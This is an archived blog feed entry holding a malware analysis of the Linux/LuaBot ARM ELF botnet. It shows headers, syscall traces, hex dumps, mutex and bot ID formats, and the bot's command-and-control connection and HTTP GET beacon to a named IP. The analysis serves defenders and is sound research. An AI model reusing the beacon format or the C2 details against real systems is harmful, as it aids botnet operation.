




/*
     FILE ARCHIVED ON 23:02:50 Sep 30, 2016 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 15:53:58 Oct 22, 2016.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
*/
// API callback
showrecentposts({"version":"1.0","encoding":"UTF-8","feed":{"xmlns":"/web/20160930230250/http://www.w3.org/2005/Atom","xmlns$openSearch":"/web/20160930230250/http://a9.com/-/spec/opensearchrss/1.0/","xmlns$blogger":"/web/20160930230250/http://schemas.google.com/blogger/2008","xmlns$georss":"/web/20160930230250/http://www.georss.org/georss","xmlns$gd":"/web/20160930230250/http://schemas.google.com/g/2005","xmlns$thr":"/web/20160930230250/http://purl.org/syndication/thread/1.0","id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245"},"updated":{"$t":"2016-09-29T17:33:32.242-07:00"},"title":{"type":"text","$t":"Malware Must Die!"},"subtitle":{"type":"html","$t":"Semper legerent \"Salve Regina\" ante venatione malware"},"link":[{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#feed","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/posts\/default"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default?alt=json-in-script\u0026orderby=published"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/"},{"rel":"hub","href":"/web/20160930230250/http://pubsubhubbub.appspot.com/"},{"rel":"next","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default?alt=json-in-script\u0026start-index=26\u0026max-results=25\u0026orderby=published"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"generator":{"version":"7.00","uri":"/web/20160930230250/http://www.blogger.com","$t":"Blogger"},"openSearch$totalResults":{"$t":"174"},"openSearch$startIndex":{"$t":"1"},"openSearch$itemsPerPage":{"$t":"25"},"entry":[{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-6333633742073487524"},"published":{"$t":"2016-09-05T09:15:00.001-07:00"},"updated":{"$t":"2016-09-22T22:38:32.584-07:00"},"title":{"type":"text","$t":"MMD-0057-2016 - New ELF botnet: Linux\/LuaBot"},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EBackground\u003C\/h2\u003E \u003Cp\u003EOn Mon, Aug 29, 2016 at 5:07 PM I received this ELF malware sample from a person (thank you!). There wasn't any detail or comment what so ever just one cute little ARM ELF stripped binary file with following data: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Earm_lsb: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, stripped\u003Cbr \/\u003Ehash: a220940db4be6878e47b74403a8079a1\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003EThis is a cleanly GCC: (GNU) 5.3.x compiled ARM arch ELF binary: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003EELF Header:\u003Cbr \/\u003E  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00\u003Cbr \/\u003E  Class:                             ELF32\u003Cbr \/\u003E  Data:                              2's complement, little endian\u003Cbr \/\u003E  Version:                           1 (current)\u003Cbr \/\u003E  OS\/ABI:                            UNIX - System V\u003Cbr \/\u003E  ABI Version:                       0\u003Cbr \/\u003E  Type:                              EXEC (Executable file)\u003Cbr \/\u003E  Machine:                           ARM\u003Cbr \/\u003E  Version:                           0x1\u003Cbr \/\u003E  Entry point address:               0x11940\u003Cbr \/\u003E  Start of program headers:          52 (bytes into file)\u003Cbr \/\u003E  Start of section headers:          995912 (bytes into file)\u003Cbr \/\u003E  Flags:                             0x5000202, has entry point, Version5 EABI, \u003Cunknown\u003E\u003Cbr \/\u003E  Size of this header:               52 (bytes)\u003Cbr \/\u003E  Size of program headers:           32 (bytes)\u003Cbr \/\u003E  Number of program headers:         4\u003Cbr \/\u003E  Size of section headers:           40 (bytes)\u003Cbr \/\u003E  Number of section headers:         15\u003Cbr \/\u003E  Section header string table index: 14\u003Cbr \/\u003E\u003C\/pre\u003EAll of the sections and headers are all there: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003ESection Headers:\u003Cbr \/\u003E  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al\u003Cbr \/\u003E  [ 1] .init             PROGBITS        000100b4 0000b4 00000c 00  AX  0   0  4\u003Cbr \/\u003E  [ 2] .text             PROGBITS        000100c0 0000c0 0d3bac 00  AX  0   0  8\u003Cbr \/\u003E  [ 3] .fini             PROGBITS        000e3c6c 0d3c6c 00000c 00  AX  0   0  4\u003Cbr \/\u003E  [ 4] .rodata           PROGBITS        000e3c78 0d3c78 00dde8 00   A  0   0  8\u003Cbr \/\u003E  [ 5] .ARM.exidx        ARM_EXIDX       000f1a60 0e1a60 000008 00  AL  2   0  4\u003Cbr \/\u003E  [ 6] .eh_frame         PROGBITS        000f1a68 0e1a68 000004 00   A  0   0  4\u003Cbr \/\u003E  [ 7] .init_array       INIT_ARRAY      00102000 0e2000 000004 00  WA  0   0  4\u003Cbr \/\u003E  [ 8] .fini_array       FINI_ARRAY      00102004 0e2004 000004 00  WA  0   0  4\u003Cbr \/\u003E  [ 9] .jcr              PROGBITS        00102008 0e2008 000004 00  WA  0   0  4\u003Cbr \/\u003E  [10] .data             PROGBITS        00102010 0e2010 011178 00  WA  0   0  8\u003Cbr \/\u003E  [11] .bss              NOBITS          00113188 0f3188 002850 00  WA  0   0  8\u003Cbr \/\u003E  [12] .comment          PROGBITS        00000000 0f3188 000011 01  MS  0   0  1\u003Cbr \/\u003E  [13] .ARM.attributes   ARM_ATTRIBUTES  00000000 0f3199 000031 00      0   0  1\u003Cbr \/\u003E  [14] .shstrtab         STRTAB          00000000 0f31ca 00007b 00      0   0  1\u003Cbr \/\u003E\u003Cbr \/\u003EProgram Headers:\u003Cbr \/\u003E  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align\u003Cbr \/\u003E  EXIDX          0x0e1a60 0x000f1a60 0x000f1a60 0x00008 0x00008 R   0x4\u003Cbr \/\u003E  LOAD           0x000000 0x00010000 0x00010000 0xe1a6c 0xe1a6c R E 0x10000\u003Cbr \/\u003E  LOAD           0x0e2000 0x00102000 0x00102000 0x11188 0x139d8 RW  0x10000\u003Cbr \/\u003E  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10\u003Cbr \/\u003E\u003C\/pre\u003EWith a nice ARM attribute too: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003EAttribute Section: aeabi\u003Cbr \/\u003EFile Attributes\u003Cbr \/\u003E  Tag_CPU_name: \"ARM10TDMI\"\u003Cbr \/\u003E  Tag_CPU_arch: v5T\u003Cbr \/\u003E  Tag_ARM_ISA_use: Yes\u003Cbr \/\u003E  Tag_THUMB_ISA_use: Thumb-1\u003Cbr \/\u003E  Tag_ABI_PCS_wchar_t: 4\u003Cbr \/\u003E  Tag_ABI_FP_rounding: Needed\u003Cbr \/\u003E  Tag_ABI_FP_denormal: Needed\u003Cbr \/\u003E  Tag_ABI_FP_exceptions: Needed\u003Cbr \/\u003E  Tag_ABI_FP_number_model: IEEE 754\u003Cbr \/\u003E  Tag_ABI_align_needed: 8-byte\u003Cbr \/\u003E  Tag_ABI_enum_size: int\u003Cbr \/\u003E  Tag_ABI_optimization_goals: Aggressive Size\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003EThe binary seemed to have signature of \u003Ci\u003ESample Matrix RSA-4096\u003C\/i\u003E Certificate, trailing this further, I found out it's the trace of the MatrixSSL certification used for the bot client to perform the secure HTTPS connection. I previously wrote this as a signature, corrected after being sure. \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E00E9897  |  Sample Matrix RSA-4096 Certificate Authorit\u003Cbr \/\u003E00E98CF  |  US1\u003Cbr \/\u003E00E98DC  |  WA1\u003Cbr \/\u003E00E98E9  |  Seattle1\u003Cbr \/\u003E00E98FB  |  INSIDE Secure Corporation1\u003Cbr \/\u003E00E991F  |  Test0\u003Cbr \/\u003E00E9927  |  140324164110Z\u003Cbr \/\u003E00E9936  |  170323164110Z0\u003Cbr \/\u003E00E9946  |  1+0)\u003Cbr \/\u003E00E9950  |  \"Sample Matrix RSA-4096 Certificate1\u003Cbr \/\u003E00E997E  |  US1\u003Cbr \/\u003E00E998B  |  WA1\u003Cbr \/\u003E00E9998  |  Seattle1\"0 \u003Cbr \/\u003E00E99AA  |  INSIDE Secure Corporation1\u003Cbr \/\u003E00E99CE  |  Test0\u003Cbr \/\u003E\u003C\/pre\u003EAlso the binary is having MatrixSSL's code libraries for encryption operation.\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/5GyZ8HyqyZklZ368D6GPkTnDs_MjIVU8aw-YVW6l_30D38bpsAbkos70c522A0T0r7xt74fuA9EwWA=w300-h300-no\u003E\u003Cbr\u003EWell, a signed ELF binary with encryption support is absolutely okay right? Unless .. what if along with that you see a hardcoded  coder's message like this? ↓ \u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/N6JiELAXvfV2nI7ZW3ACl0hOTgDDn8Qsfg_khf1FDd7LGgxSk5FYxL_77tZ_5mvG1vdgV_UO18Yuvg=w509-h238-no\u003E\u003Cbr\u003E\u003Ci\u003EView the binary's ASCII in the last part and you'll see the first email address.\u003C\/i\u003E \u003Cp\u003EIt seems the sender of the sample was finding this malware already infected a system, since I figured the self-copied name on post infection is as per the sample's  filename sent: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/dg9za9uxJx396s0W3EDWAbRfZi7_OsWZR5bXP9mUOLnoDbuOUPuVTujD1X1tAwu1RZaXyHxUxYyiRA=w1060-h299-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/dg9za9uxJx396s0W3EDWAbRfZi7_OsWZR5bXP9mUOLnoDbuOUPuVTujD1X1tAwu1RZaXyHxUxYyiRA=w555-h555-no\u003E\u003C\/a\u003E \u003Cp\u003EAnd this is why this \"adventure\" was started..  \u003Cp\u003E\u003Ch2\u003EWhat is this ELF?\u003C\/h2\u003E \u003Cp\u003EThis is a new ELF botnet malware, coded in Lua [\u003Ca href=\"https:\/\/www.lua.org\/\"\u003Elink\u003C\/a\u003E] language ( @$LuaVersion: Lua 5.3.0). It is the first time to find an lua language ELF compiled malware, specifically in ARM cpu architecture, so let's call it as \u003Cb\u003E\"\u003Cb\u003ELinux\/LuaBot\u003C\/b\u003E\"\u003C\/b\u003E.  \u003Cp\u003EBelow is the summary for this verdict:  \u003Cp\u003EThe lua language used details can be seen in these viewable .lua source files traced, along with the lua runtime libaries and some botnet commands used:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/3BwY2NgJ-w5bCKEQW-dFXtZmiM1ernHegKgey9cRch9jFYKL9wp_NylkIBVncn0yFD1CgjzhSrSiqQ=w700-h548-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/3BwY2NgJ-w5bCKEQW-dFXtZmiM1ernHegKgey9cRch9jFYKL9wp_NylkIBVncn0yFD1CgjzhSrSiqQ=w555-h555-no\u003E\u003C\/a\u003E \u003Cp\u003EThe botnet commands can be traced in these called functions:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/WFr_M4MO7o59LJZ-9TWlxww4CPQjHOMqdCtue4V72WMWFkLEroDcJKEsIe7LiytGPwyLnerQADHVOA=w998-h644-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/WFr_M4MO7o59LJZ-9TWlxww4CPQjHOMqdCtue4V72WMWFkLEroDcJKEsIe7LiytGPwyLnerQADHVOA=w555-h555-no\u003E\u003C\/a\u003E \u003Cp\u003EThe binary was still in fully undetected (in short: FUD) state when I wrote this analysis:\u003Cbr\u003E\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/e1f6d967db61ee131dc32b817a9285f5da3ebe3e1f9a4281c8fac9339e2b4521\/analysis\/\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/t-eFpdt5RwkpI4zCearc2BI0a4O35H0ee49LHWFTrvhxicpqkKkAYTOq9enWIddH7_39sXUQJo4evg=w580-h623-no\u003E\u003C\/a\u003E \u003Cp\u003EAt the time I firstly reverse-engineered ELF Linux\/Luabot, I was on making short announcement \u0026 awareness about this new threat:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/7BJLgrE81xwbet0mgiJkU-lmuvD24mvZuDB_EFNrzvS4G-FfSTyOCamReUjvU_t-6_qhfLzB14C7TA=w919-h656-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/7BJLgrE81xwbet0mgiJkU-lmuvD24mvZuDB_EFNrzvS4G-FfSTyOCamReUjvU_t-6_qhfLzB14C7TA=w555-h555-no\u003E\u003C\/a\u003E\u003Cbr\u003EBut yet, that report is not enough to explain the threat, there are a lot of things in this malware that can not be explained in one picture....  \u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/Z5GfZYfU75IKYYmejwcWQwaCpmmAFHKvqSwkL8YQDJ3wKxjTpXvQeco59z0ZYtF52G1VJWWkU_-AgA=w333-h384-no\u003E \u003Cp\u003EThe following sections will explain more details on the threat..  \u003Cp\u003E\u003Ch2\u003EHow Linux\/LuaBot infects us (initial steps)\u003C\/h2\u003E \u003Cp\u003EIt will be a lie to say that I know how this sample firstly infected a Linux host, since I only received the post-infected form of the sample. But don't worry, by some ELF analysis I can explain \u003Ci\u003Ea bit\u003C\/i\u003E on how it works as per followings:  \u003Cp\u003E\u003Cli\u003EAfter trying to increase limit on open files via \u003Ci\u003Esetrlimit(RLIMIT_NOFILE, \u0026foo)\u003C\/i\u003E, the malware during the startup will fork itself to two new processes. On some Linux system that is secured well, and if the malware is not getting the \u003Ci\u003Euid zero\u003C\/i\u003E (read: root), the \u003Ci\u003Esetrlimit()\u003C\/i\u003E syscall can't be executed, and the coder forgot to sanitize \u003Ci\u003Estderr(perror)\u003C\/i\u003E for it. So if you see error message of \u003Ci\u003E\u003Cb\u003E\"Setting RLIMIT_NOFILE failed, errno 1\"\u003C\/b\u003E\u003C\/i\u003E as output of any suspicious binary, your system is possibly infected. \u003Cp\u003E\u003Cli\u003EJust right before forking is done, the malware will send you following message: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E\"Hi. Mail me if u want: xxxxx@xxx.ru\"\u003Cbr \/\u003E\u003C\/pre\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/b3UcRnOOMY4wADYJPbdM_rZOXpjHw_Mku9dku8HQjVMgH9hvjGSOp7AU0wyEIfvTIfJ9f_7LfPc0uQ=w430-h344-no\u003E\u003Cbr\u003EI don't email him but I was checking these email addresses in Yandex Mail, by trying to make new account under @yandex.ru using these accounts, and someone is using it already. Meaning, the email addresses are there and we have high possibility owned by the bot coder. Picture? ↓ \u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/uGKN89ZIhpXi9jSEdOYWK4x9h-d90ebqBFfoKkQ47ctXwd9IFGyyXBv3Xwf6r32cLXWdXvW9sYduTQ=w444-h380-no\u003E \u003Cli\u003EAnd then open the file socket bound to the mutex formed by: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Ebbot_mutex_203508\u003Cbr \/\u003E\u003C\/pre\u003Ewhich 203508 in the part of mutex is \u003Ci\u003E\u003Cb\u003Ehard-coded number\u003C\/b\u003E\u003C\/i\u003E in this ELF (see screenshot of \u003Ci\u003Earm_lsb\u003C\/i\u003E filename) and it is actually the \u003Ci\u003Eversion\u003C\/i\u003E of this botnet, I'll explain and snip about this version matter in the next part of this post.  \u003Cp\u003E\u003Cli\u003EAfter the first forked process is started, the main process will be terminated. This new first process will assign a PID with \u003Ci\u003Egettid \u003C\/i\u003E\u0026 \u003Ci\u003Esetsid\u003C\/i\u003E, and then \u003Ci\u003Efork\u003C\/i\u003E() its process one more time to launch the real deal, the malware main process (Noted that the initial process will be dead at this time). The first fork process, ..will be bound via \u003Ci\u003Eunix file socket\u003C\/i\u003E with the \u003Ci\u003Emutex\u003C\/i\u003E created previously and will sit there and launched \u003Ci\u003Ewait\u003C\/i\u003E() syscall, ..is practically a useless process for analysis.  \u003Cp\u003EThe second forked process is the main activity of this malware, and does malicious activities: \u003Cli\u003EChecking the active (file) sockets in \u003Ci\u003E\/proc\/net\/unix\u003C\/i\u003E and network sockets (\u003Ci\u003E\/proc\/net\/tcp*\u003C\/i\u003E).  \u003Cli\u003EReading all system's active process names \u0026 PID in \u003Ci\u003E\/proc\/{PID}\/*\u003C\/i\u003E with utilizing \u003Ci\u003Egetidents64\u003C\/i\u003E to enumerate them, practically it's an approach to see what's running and what values are actually can be fetch, i.e.: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Ecall getdents64(%d, {\u003Cbr \/\u003E{d_ino=1, d_off=1, d_type=DT_DIR, d_reclen=24, d_name=\".\"} \u003Cbr \/\u003E{d_ino=1, d_off=2, d_type=DT_DIR, d_reclen=24, d_name=\"..\"} \u003Cbr \/\u003E   :\u003Cbr \/\u003E{d_ino=4026532032, d_off=11, d_type=DT_REG, d_reclen=24, d_name=\"kmsg\"} \u003Cbr \/\u003E{d_ino=4026532031, d_off=12, d_type=DT_REG, d_reclen=32, d_name=\"softirqs\"} \u003Cbr \/\u003E{d_ino=4026532030, d_off=13, d_type=DT_REG, d_reclen=32, d_name=\"version\"} \u003Cbr \/\u003E{d_ino=4026532029, d_off=14, d_type=DT_REG, d_reclen=32, d_name=\"uptime\"} \u003Cbr \/\u003E{d_ino=4026532028, d_off=15, d_type=DT_REG, d_reclen=24, d_name=\"stat\"} \u003Cbr \/\u003E{d_ino=4026532027, d_off=16, d_type=DT_REG, d_reclen=32, d_name=\"meminfo\"} \u003Cbr \/\u003E{d_ino=4026532026, d_off=17, d_type=DT_REG, d_reclen=32, d_name=\"loadavg\"} \u003Cbr \/\u003E{d_ino=4026532025, d_off=18, d_type=DT_REG, d_reclen=32, d_name=\"interrupts\"} \u003Cbr \/\u003E{d_ino=4026532024, d_off=19, d_type=DT_REG, d_reclen=32, d_name=\"devices\"} \u003Cbr \/\u003E{d_ino=4026532023, d_off=20, d_type=DT_REG, d_reclen=32, d_name=\"cpuinfo\"} \u003Cbr \/\u003E{d_ino=4026532022, d_off=21, d_type=DT_REG, d_reclen=32, d_name=\"consoles\"} \u003Cbr \/\u003E{d_ino=4026532021, d_off=22, d_type=DT_REG, d_reclen=32, d_name=\"cmdline\"} \u003Cbr \/\u003E{d_ino=4026532020, d_off=23, d_type=DT_REG, d_reclen=32, d_name=\"locks\"} \u003Cbr \/\u003E{d_ino=4026532019, d_off=24, d_type=DT_REG, d_reclen=32, d_name=\"filesystems\"} \u003Cbr \/\u003E{d_ino=4026532018, d_off=25, d_type=DT_REG, d_reclen=32, d_name=\"slabinfo\"} \u003Cbr \/\u003E\u003C\/pre\u003EThis technique is also very handy to secure your process from some malicious infection, I am doing it myself to analyze some ELF rootkits or kernel modular malware that hooked processes.  \u003Ci\u003E\u003Cp\u003EIntermezzo: \u003Cb\u003ESome of my ELF malware analysis protip:\u003C\/b\u003E \u003Cp\u003EFor the crooks who think that I use any kind of \u003Ci\u003E*trace\u003C\/i\u003E scheme for reading your UNIX malcode's work, well.. dream on! You can do harder or hit the school chair once again, because I never trust \u003Ci\u003Eptrace\u003C\/i\u003E for such purpose (except for my NIX related development debugs). For the good folks, please see my previous published presentation in ELF Reversing Workshop, explaining a nice trick I use to beat malcoder's scheme in evading debugging tricks on infecting UNIX systems. This know-how was successfully presented, demo and transferred to senior reversers in my community.\u003C\/i\u003E \u003Cli\u003EChecking the current user's privilege by getuid32, geteuid32, getgid32, getegid32 \u003Cli\u003EChecking the network interface name and its IP via \u003Ci\u003Eopen\u003C\/i\u003E() to \u003Ci\u003E\/proc\/net\/route\u003C\/i\u003E. opened a check socket and using \u003Ci\u003Eioctl\u003C\/i\u003E(). \u003Cli\u003E Assemble BotID \u0026 writing the ID as \u003Ci\u003Estdout\u003C\/i\u003E, with the following formulation:  \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E\"Bot id is \\t{IFACE-NAME}-{IPADDR}-{NUM}[10-9]{6}:{Version}\" \u003Cbr \/\u003E\u003C\/pre\u003EThe formula can be seen if we hack further, with the lua script traces: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E0000 0000 2240 0000 2028 2564 2b29 2040  ....\"@.. (%d+) @\u003Cbr \/\u003E6262 6f74 5f6d 7574 6578 5f28 2564 2b29  bbot_mutex_(%d+)\u003Cbr \/\u003E0000 0000 0000 0000 f000 0000 d101 0000  ................\u003Cbr \/\u003E\u003C\/pre\u003ESo it seems that the coder is forming the ID and mutex with the version value intact.\u003Cbr\u003EIn relation with the data above, we know how the Luabot will not duplicate the infection. These are lua scripts from the reversed lua script, formed as similar as per below:\u003Cbr\u003E\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/o_S6kw5SsgmJuoJOJv4Ht2lOr_JedpEw0TSapgCS4Ao-XVL5BSNCBUADmkBjAhFlwr0Skxs_ttB7AQ=w444-h116-no\u003E\u003Cbr\u003EYes, it checks for the version of the current running botnet platform before it daemonized itself. If it found the current running version is older, LuaBot will exit the current running instance.  \u003Cli\u003EThe malware then run \u003Cb\u003Etest_domain()\u003C\/b\u003E lua function to load lookup domains: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E0x012b7390  0000 0000 726f 6375 676f 6f67 6c65 2e63  ........google.c\u003Cbr \/\u003E0x012b73a0  6f6d 0034 343a 2063 3100 0000 3100 0000  om.44: c1...1...\u003Cbr \/\u003E\u003Cbr \/\u003E0x012b73c0  0000 0000 726d 6973 6661 6365 626f 6f6b  ........facebook\u003Cbr \/\u003E0x012b73d0  2e63 6f6d 0000 0000 3100 0000 3100 0000  .com....1...1...\u003Cbr \/\u003E\u003Cbr \/\u003E0x012b73f0  0000 0000 c09e 0200 6261 6964 752e 636f  ........baidu.co\u003Cbr \/\u003E0x012b7410  e073 2b01 0402 0000 c1c4 d41a 0a00 0000  .s+.............\u003Cbr \/\u003E\u003Cbr \/\u003E0x012b7420  0000 0000 c8af 2c01 616d 617a 6f6e 2e63  ......,.amazon.c\u003Cbr \/\u003E0x012b7430  6f6d 0001 a076 2b01 c040 2b01 e040 2b01  om...v+..@+..@+.\u003Cbr \/\u003E\u003Cbr \/\u003E0x01296de0  0006 000c 0977 696b 6970 6564 6961 036f  .....wikipedia.o\u003Cbr \/\u003E0x01296df0  7267 0000 0100 01c0 1600 0200 0100 02a3  rg..............\u003Cbr \/\u003E\u003C\/pre\u003Ewhich are \u003Cb\u003Egoogle.com\u003C\/b\u003E, \u003Cb\u003Efacebook.com\u003C\/b\u003E, \u003Cb\u003Ebaidu.com\u003C\/b\u003E, \u003Cb\u003Eamazon.com\u003C\/b\u003E and \u003Cb\u003Ewikipedia.org\u003C\/b\u003E. \u003Cli\u003EThe domains will be looked up to the below DNS servers: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E69.171.239.12 | a.ns.facebook.com. |32934 | 69.171.239.0\/24 | FACEBOOK | US | facebook.com | Facebook Inc.\u003Cbr \/\u003E192.12.94.30 | e.gtld-servers.net. |36629 | 192.12.94.0\/24 | MGTLD | US | verisign.com | Verisign Global Registry Services\u003Cbr \/\u003E198.41.0.4 | a.root-servers.net. |36625 | 198.41.0.0\/24 | KGTLD | US | verisign-grs.net | VeriSign Infrastructure \u0026 Operations\u003Cbr \/\u003E202.108.22.220|xd-22-220-a8.bta.net.cn.|4808 | 202.108.0.0\/18 | CHINA169 | CN | chinaunicom.com | China Unicom Beijing Province Network\u003Cbr \/\u003E204.74.108.1|pdns1.ultradns.net.|12008 | 204.74.108.0\/24 | ULTRADNS | US | ultradns.com | UltraDNS Corp\u003Cbr \/\u003E\u003C\/pre\u003EThe purpose of these checks is understandable, the Linux\/Luabot is making sure that after infecting a node it has the intenet connection or not. And to avoid suspicious traffic alert it queries SNS in every possible topology internet location. At this stage we can see that the coder seems has no intention to infect Russia Federation or East Europe related network since there is no SNS services in the territory are in check, like VK or Yandex or others. Even it is clearly made by someone who use Russian language (hint: @yandex.RU). Interesting.  \u003Cli\u003ENext, the malware will connect to the CNC in \u003Cb\u003E217.23.3.47\u003C\/b\u003E and send an \u003Cb\u003EHTTP\/1.1 GET\u003C\/b\u003E command. Linux\/LuaBot was firstly socket-connecting to \u003Cb\u003E217.23.3.47\u003C\/b\u003E by \u003Cb\u003Eport TCP\/1085\u003C\/b\u003E, there's no further activity in this connected port, assuming the checking scheme to poke the CNC and to make sure the CNC is up. \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Econnect(8, {sa_family=AF_INET, sin_port=htons(\"1085\"), sin_addr=inet_addr(\"217.23.3.47\")}, 16)\u003Cbr \/\u003E\u003C\/pre\u003EAnd then, followed by the \u003Ci\u003EHTTP request\u003C\/i\u003E to port \u003Cb\u003ETCP\/80\u003C\/b\u003E of the same IP address: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003EGET \"\/bot?bid={IFACE}-{IPADDR}-{NUM}0123456:{MUTEX} HTTP\/1.1\\r\\n\"\u003Cbr \/\u003EConnection: \"close\\r\\n\"\u003Cbr \/\u003EHost: \"217.23.3.47\\r\\n\\r\\n\"\u003Cbr \/\u003E\u003C\/pre\u003EThe origin of this CNC: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E217.23.3.47|s4.mailuprising.com.|49981 | 217.23.0.0\/20 | WORLDSTREAM | NL\u003Cbr \/\u003E\u003C\/pre\u003EI recorded this CNC connection session in PCAP with its encrypted form replies from \u003Cb\u003E217.23.3.47\u003C\/b\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/_wLawEiUvXtlsiqJ5QwIq9Y6PnlwSTsGizTBQ5IvtfJRK6ImtUVtIfpKERCqiqGCfkBEjsJqZi_Buw=w1093-h525-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/_wLawEiUvXtlsiqJ5QwIq9Y6PnlwSTsGizTBQ5IvtfJRK6ImtUVtIfpKERCqiqGCfkBEjsJqZi_Buw=w555-h525-no\u003E\u003C\/a\u003E\u003Cbr\u003EAs you can see in the reply traffic part, it contains data of specific format of:\u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Escript|{Encrypted data}|endscript\u003Cbr \/\u003E＜br＞\u003C\/pre\u003E \u003Cp\u003EThe thing is, maybe LuaBot coder doesn't think reverser can decode this data, well..  \u003Cp\u003EA simple reversing can decode this hard-coded CNC \u003Cb\u003Eeasily\u003C\/b\u003E:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/1gVTHLEVtH7H4gnaJednBuBprCi1K75_hKgbHyv-JRL13AuhmRGXx455GeRNfyka0UjDDYI3K3lvcw=w853-h575-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/1gVTHLEVtH7H4gnaJednBuBprCi1K75_hKgbHyv-JRL13AuhmRGXx455GeRNfyka0UjDDYI3K3lvcw=w555-h575-no\u003E\u003C\/a\u003E \u003Cli\u003EAt this point the data fetched is processed (decrypted), this is when we can receive some \"goodies\", like:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/MIqMgmgHlDbuSbn5QL67lgp6EiMRuYgpPRJ00SO0_VVFL6NKn9lJGHPcTuPMfRyVyyXQvH0ZVxjDEw=w808-h957-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/MIqMgmgHlDbuSbn5QL67lgp6EiMRuYgpPRJ00SO0_VVFL6NKn9lJGHPcTuPMfRyVyyXQvH0ZVxjDEw=w555-h555-no\u003E\u003C\/a\u003E\u003Cbr\u003ETo be beautified into:\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/yO5JDLJ-4tQKOgOzBL9N8cyhca7K1PNCET02CC2Y3H8HV-Vh4yqBmvrk9pb7U9qnZDPZGnFELsr-qw=w388-h921-no\u003E\u003Cbr\u003EThese are the data to be passed to the CNC sending function coded in Lua, that's using socket function to communicate with any of those nodes. It is suggested the access to open SOCKS which is specifically bound to those IP. \u003Cp\u003EThe listed IP addresses are all nodes of \u003Cb\u003EAS4998\u003C\/b\u003E from \u003Cb\u003E109.236.80.0\/20\u003C\/b\u003E, \u003Cb\u003E217.23.0.0\/20\u003C\/b\u003E and \u003Cb\u003E93.190.140.0\/22\u003C\/b\u003E belong to a dedicated server hosting service \u003Cb\u003EWorldStream.NL\u003C\/b\u003E, the customer layer service IP, \u003Cb\u003Ein Netherlands\u003C\/b\u003E. It looks like these IP is \u003Cb\u003Ereserved \u003C\/b\u003Eby the botnet coder for a purpose, like maybe as a failover for CNC, or open socks for a merchandise. \u003Cb\u003EWorldStraem Hosting in Netherlands\u003C\/b\u003E should be warned for their abusive user, which is possibly originated (strongly) from Russia.  \u003Cp\u003EThere is another interesting data found, a botnet management trace\u003Cbr\u003E\u003Ca 